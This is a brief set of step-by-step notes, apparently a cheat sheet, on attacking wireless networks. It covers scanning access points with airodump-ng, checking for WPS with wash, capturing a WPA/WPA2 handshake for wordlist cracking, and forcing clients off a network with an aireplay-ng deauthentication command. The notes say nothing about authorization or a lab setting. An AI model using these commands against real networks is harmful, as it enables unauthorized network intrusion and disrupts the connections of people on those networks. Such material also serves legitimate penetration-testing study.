## Step 1:
	Set adapter to monitor mode and run airodump-ng <int name> to see available AP.
	If WEP is in use, proceed with WEP cracking

## Step 2:
	Run wash --interface wlan0 to check if WPS is enabled on WPA/WPA2 AP
	If enabled, proceed with WPS exploitation.

## Step3: Crack WPA/WPA2 Using Wordlist & Handshake
	Run airodump-ng on the target AP to capture handshake
	airodump-ng --bssid<target AP mac> --channel<target AP channel> --write wpa_handshake wlan0

Disconnect a client from the network in order to capture the handshake when the client tries to reconnect
aireplay-ng --deauth 4 -a <target Ap mac> -c <target client mac> wlan0

